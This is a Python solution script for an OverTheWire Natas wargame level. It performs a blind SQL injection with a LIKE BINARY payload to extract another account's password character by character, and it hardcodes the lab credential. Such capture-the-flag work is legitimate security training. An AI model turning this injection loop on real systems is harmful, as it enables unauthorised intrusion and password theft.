import requests, string

username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
url = f"http://{username}:{password}@{username}.natas.labs.overthewire.org/index.php?debug=1" #debug=1 dumps out the SQL query if you print out the response

possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.

resultFlag = "" #Will hold final flag and is goind to be built char by char
characterCounter = 0 #Counter which character within possibleCharacters we are currently testing

while(len(resultFlag) < 32): #We know flags are 32 characters long
    current_pw = resultFlag + possibleCharacters[characterCounter] #build current pw from previous leaked characters and the candidate from current iteration
    current_challenge = f'natas16" AND password LIKE BINARY "{current_pw}%' #Query whether the password for natas16 begins with current_pw
    print("Testing: " + current_pw)
    form_data = {
        "username" : current_challenge
    }
    resp = requests.post(url, form_data)

    if("This user doesn't exist." in resp.text): #We guessed wrong. Increment characterCounter and go next.
        characterCounter += 1        
    else: #We guessed correctly! Add character to resultFlag and restart for the next character in the pw we are guessing.
        print("match!")
        resultFlag = current_pw
        characterCounter = 0
            

print("Flag: " + resultFlag)
